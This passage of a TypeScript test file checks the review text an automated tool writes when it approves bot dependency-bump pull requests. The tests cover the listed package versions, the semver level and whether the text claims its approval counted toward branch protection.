      expect(body).toContain("`left-pad`: ^1.0.0 -> ^1.0.1");
      expect(body).toContain("`zod`: ^3.23.0 -> ^3.24.0");
      expect(body).toContain("Semver level: minor"); // the largest jump in the diff
      expect(body).toContain("Change class: deps");
      expect(body).toContain(`- Head commit: \`${HEAD}\``);
      expect(body).toContain(`Author: ${BOT}`);
      expect(body).toContain("2 file(s), 26 changed line(s)");
      expect(body).toContain("Manifests: package.json");
      // This repository has no protection at all, so the approval was counted toward nothing and the
      // body must not claim otherwise. The protected case is asserted in the steward flow test.
      expect(body).toContain("branch protection is satisfied;");
      expect(body).not.toContain("counting this approval");
    });

    it("claims the approval was counted only where a required-approvals rule actually exists", async () => {
      const counted = seedBotBump(undefined, new RecomputesOnApproval());
      seedProtectedAwaitingReview(counted, 1);
      await run(counted, { autonomy: "auto" });
      expect(counted.reviews[0].body).toContain("counting this approval toward its required-approvals rule");

      // Protection exists but asks for zero approvals: the pending approval changed no arithmetic.
      const vacuous = seedBotBump();
      vacuous.setBranchProtection(REPO, "main", { ...requiresApprovals(0), requiresPullRequestReviews: true });
      await run(vacuous, { autonomy: "auto" });
      expect(vacuous.reviews[0].body).not.toContain("counting this approval");
    });

    it("caps the package list and counts the rest", async () => {
      const names = Array.from({ length: 14 }, (_, i) => `pkg-${i}`);
      const patch = ["@@ -1,30 +1,30 @@", '   "dependencies": {',
        ...names.flatMap((n) => [`-    "${n}": "1.0.0",`, `+    "${n}": "1.0.1",`])].join("\n");
      const gh = seedBotBump([manifest(patch)]);
      await run(gh, { autonomy: "auto" });

      const body = gh.reviews[0].body;
      expect(body).toContain("`pkg-0`: 1.0.0 -> 1.0.1");
      expect(body).toContain("`pkg-9`: 1.0.0 -> 1.0.1");
      expect(body).not.toContain("`pkg-10`");
      expect(body).toContain("and 4 more");
    });
  });
});
